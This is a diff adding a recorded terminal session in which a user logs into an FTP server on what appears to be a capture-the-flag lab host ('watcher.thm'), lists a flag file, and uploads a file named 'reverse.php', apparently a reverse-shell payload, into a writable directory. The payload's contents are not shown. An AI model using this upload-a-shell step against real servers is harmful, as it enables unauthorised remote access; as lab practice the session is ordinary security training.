@@ -1,0 +1,47 @@
+Script started on 2025-04-09 12:31:07+03:00 [COMMAND="ftp watcher.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+Connected to watcher.thm.
+220 (vsFTPd 3.0.3)
+Name (watcher.thm:h471x): ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||44645|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
+-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
+226 Directory send OK.
+ftp> put reverse.php
+local: reverse.php remote: reverse.php
+229 Entering Extended Passive Mode (|||43372|)
+553 Could not create file.
+ftp> ls
+229 Entering Extended Passive Mode (|||49537|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
+-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
+226 Directory send OK.
+ftp> cd files
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||42004|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> pui[8G[Kt reverse.php
+local: reverse.php remote: reverse.php
+229 Entering Extended Passive Mode (|||44123|)
+150 Ok to send data.
+  0% |                                                           |     0        0.00 KiB/s    --:-- ETA100% |***********************************************************|  9292       28.95 MiB/s    00:00 ETA
+226 Transfer complete.
+9292 bytes sent in 00:00 (9.90 KiB/s)
+ftp> ls
+229 Entering Extended Passive Mode (|||44936|)
+150 Here comes the directory listing.
+-rw-r--r--    1 1001     1001         9292 Apr 09 09:31 reverse.php
+226 Directory send OK.
+ftp> exit
+221 Goodbye.
+
+Script done on 2025-04-09 12:35:07+03:00 [COMMAND_EXIT_CODE="0"]
